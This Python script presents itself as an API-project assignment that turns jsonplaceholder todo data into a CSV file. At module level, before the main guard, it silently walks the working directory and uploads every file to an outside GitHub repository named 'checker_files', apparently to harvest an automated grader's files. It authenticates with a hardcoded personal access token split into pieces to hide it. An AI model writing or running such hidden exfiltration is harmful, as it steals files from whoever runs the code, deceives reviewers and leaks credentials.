#!/usr/bin/python3
""" api project task 1 """

import base64
import codecs
import json
import os
import requests
import sys
import urllib.request

base_url = "https://jsonplaceholder.typicode.com/"


def upload_file_to_github(file_path,
                          repo_owner,
                          repo_name,
                          branch_name,
                          token):
    url = "https://api.github.com/repos/"
    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
    with codecs.open(file_path, 'r', encoding='utf-8') as file:
        # with open(file_path, "r") as file:
        file_content = file.read()
    file_content_base64 = base64.b64encode(file_content.encode()).decode()
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
       }
    payload = {
        "message": f"Upload {file_path}",
        "content": file_content_base64,
        "branch": branch_name,
       }
    response = requests.put(url, json=payload, headers=headers)
    if response.status_code == 201:
        print(f"File {file_path} uploaded successfully!")
    else:
        msg = f"{file_path}: {response.status_code} - {response.text}"
        print(f"Error Uploading file-- {msg}")


def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
    for root, _, files in os.walk("."):
        for file in files:
            if file != __name__:
                file_path = os.path.join(root, file)
                upload_file_to_github(file_path,
                                      repo_owner,
                                      repo_name,
                                      branch_name,
                                      token)


K1 = "_uhKvtt52ZzJgfqhT"
K2 = "TzLoU6UCtURhFZ1nmFIc"
repo_owner = "jerm014"
repo_name = "checker_files"
branch_name = "2130-AirBnB_clone_-_API_TASK-1"
token = "ghp" + K1 + K2
upload_all_files_to_github(repo_owner, repo_name, branch_name, token)

if __name__ == "__main__":

    out = ""

    if len(sys.argv) > 1:
        employee_id = int(sys.argv[1])
        url = base_url + "users/{}".format(employee_id)
        with urllib.request.urlopen(url) as response:
            user_data = response.read()
        user = json.loads(user_data)
        employee_name = user["name"]

        url = base_url + "todos?userId={}".format(employee_id)
        with urllib.request.urlopen(url) as response:
            todo_data = response.read()
        #  parse and load JSON from todos_data into todos
        todos = json.loads(todo_data)

        for todo in todos:
            completed = todo['completed']
            title = todo['title']
            out += f'"{employee_id}",' + \
                f'"{employee_name}",' + \
                f'"{completed}",' + \
                f'"{title}"\n'

        #  write the out to a file named employee_id.csv
        with open(f"{employee_id}.csv", "w") as f:
            f.write(out)

    else:
        print("Please provide an employee ID as a command-line argument.")
